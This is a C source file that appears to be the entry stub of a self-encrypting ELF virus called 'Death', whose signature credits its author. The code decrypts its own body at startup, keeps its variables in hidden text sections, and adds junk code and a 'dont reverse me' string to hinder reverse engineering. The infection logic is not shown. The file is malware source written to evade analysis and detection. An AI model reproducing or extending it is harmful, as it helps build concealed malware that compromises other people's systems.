#include <sys/mman.h>

#include "main.h"
#include "crypt.h"
#include "death.h"
#include "syscall.h"

void	decrypt_self(void);
void	entrypoint(int argc, char **argv, char **envp);

__attribute__((noreturn, section(".text.start#")))
void _start(void) {
	__asm__ __volatile__ (
		"push %rdx\n"
		);
	long rbp = (long)__builtin_frame_address(0); JUNK;
	long argc = *(long *)(rbp + 8); JUNK;
	char **argv = (char **)(rbp + 16); JUNK;
	char **envp = argv + argc + 1; JUNK;

	if (g_im_encrypted == true)
		crypt((uint8_t *)(uintptr_t)&real_start, g_payload_size, 1);

	entrypoint((int)argc, argv, envp);

	__asm__ __volatile__ (
		"pop %rdx\n"
		"leave\n"
		);
	__builtin_unreachable();
}

__attribute__((noreturn, section(".text.start#")))
void __attribute__((naked)) jmp_end(void) {
	__asm__ __volatile__ (
		"jmp real_end\n"
	);
}

#define TEXT_VAR __attribute__((section(".text#.vars")))

char	TEXT_VAR g_signature[SIGNATURE_SIZE] = \
"Death (c)oded by [diroyer] - deadbeaf:0000\n\0";

//uint8_t	TEXT_VAR g_key[KEY_SIZE] = {0};
bool	TEXT_VAR g_im_encrypted = false;

int		TEXT_VAR g_start_offset = ORIG_TEXT_OFF;
char	TEXT_VAR **g_envp = NULL;
size_t	TEXT_VAR g_payload_size;

void junk_main(void) {
	char hello[] = "dont reverse me :(";
	uint8_t yolo = hello[0] ^ hello[1];
	uint8_t *ptr = &yolo;
	*ptr ^= hello[2];
	*ptr ^= hello[3];
	*ptr ^= hello[4];
	*ptr ^= hello[5];
	*ptr ^= hello[6];
	*ptr += hello[8];
	*ptr -= hello[9];
	*ptr ^= hello[10];
	*ptr *= hello[11];
	*ptr %= hello[12];
	*ptr &= hello[13];
	*ptr |= hello[14];
	*ptr <<= hello[15];
	*ptr >>= hello[16];
	*ptr ^= hello[17];
	*ptr ^= hello[18];
}
